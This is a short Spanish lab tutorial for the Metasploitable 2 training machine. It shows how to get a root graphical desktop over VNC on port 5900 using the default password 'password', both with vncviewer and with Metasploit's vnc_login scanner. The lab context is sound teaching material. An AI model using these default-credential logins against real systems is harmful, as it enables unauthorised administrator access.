# VNC (puerto 5900) — Metasploitable 2

> Práctica de laboratorio: aplicar únicamente sobre tu propia máquina Metasploitable 2 (`192.168.100.9`), aislada de Internet. Documento de la serie [Reconocimiento y Metasploit](./01_reconocimiento_y_metasploit.md).

**Qué es:** **VNC** da acceso al **escritorio gráfico** remoto. **Puerto 5900**.

**Cómo se explota:** la contraseña de VNC es, sencillamente, **`password`**, y la sesión que abre es la del usuario **root**, así que obtienes un escritorio de administrador.

## Explotación manual (sin Metasploit)

```bash
vncviewer 192.168.100.9:5900
# contraseña: password  -> escritorio gráfico como root
```

## Explotación con Metasploit

```bash
use auxiliary/scanner/vnc/vnc_login
set RHOSTS 192.168.100.9
run
# confirma la contraseña 'password'
```
